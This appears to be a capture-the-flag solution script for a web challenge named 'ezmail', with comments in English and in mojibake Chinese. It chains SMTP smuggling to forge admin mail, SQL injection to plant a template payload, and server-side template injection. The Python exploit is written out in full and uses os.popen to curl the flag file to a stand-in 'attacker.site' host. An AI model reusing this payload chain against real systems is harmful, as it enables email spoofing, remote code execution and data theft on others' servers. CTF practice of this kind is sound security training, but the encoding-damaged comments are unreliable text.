# ��Ҫ������SMTP Smuggling
# ע�⵽`/admin`��ʹ��`render_template_string()`ƴ����Ⱦ���ɹ���SSTI��
# ���еĿɿز���Դ�Ա��������������`admin@ezmail.org`���ʼ��е�Subject���urlָ��ı���ҳ�����ݡ�
# ��Ȼ`/report`���ܷ����ʼ������ǹ̶�������Ϊ`ignored@ezmail.org`��
# ��ϸ�Ķ�`/report`�µĴ��뷢�֣��ʼ�����Ҳ����ƴ��
# (Ϊ�˷��㹹������ʱ������ħ����`smtplib._quote_periods`)
# ���Թ���SMTP Smuggling��α�췢����Ϊ`admin@ezmail.org` ��
# ͬʱע�⵽`news`ҳ�����SQLI�����ǽ�SSTI Payload��UNION�ķ�ʽ����ҳ��������`/admin` ��ȡ���ɡ�

# The main focus is on SMTP Smuggling.
# It is noticed that the render_template_string() method is used to concatenate and render under /admin, which could allow for SSTI (Server-Side Template Injection).
# The controllable part comes from the email in the local inbox from admin@ezmail.org, where the URL in the Subject points to a local page's content.
# Although emails can be sent from /report, the sender is fixed as ignored@ezmail.org.
# Upon carefully reviewing the code under /report, it is found that email sending also involves concatenation.
# (To make it easier to construct the question, I specifically modified smtplib._quote_periods.)
# SMTP Smuggling can be constructed to forge the sender as admin@ezmail.org.
# Additionally, it is observed that the news page is vulnerable to SQL Injection (SQLi).
# Consider injecting the SSTI Payload via UNION into the page, which can then be read by /admin.

import requests

cookies = {
    'connect.sid': 'XXX',
}

headers = {
    'Host': 'ezmail.org:3000',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close'
}

content = """FAKE CONTENT\r\n""" + "\n.\n" + """\r\nmail FROM:<admin@ezmail.org>\r\nrcpt TO:<admin@ezmail.org>\r\ndata\r\nFrom: admin@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: http://ezmail.org:3000/news?id=5 union select (select '{{request.application.__globals__.__builtins__.__import__("os").popen("curl http://attacker.site -d @/flag").read()}}') --\r\n\r\nSMUGGLING"""
data = f'url=123&content={content}'

response = requests.post('http://XXX.XXX.XXX.XXX:XXXX/report', cookies=cookies, headers=headers, data=data, verify=False)
requests.get('http://XXX.XXX.XXX.XXX:XXXX/bot')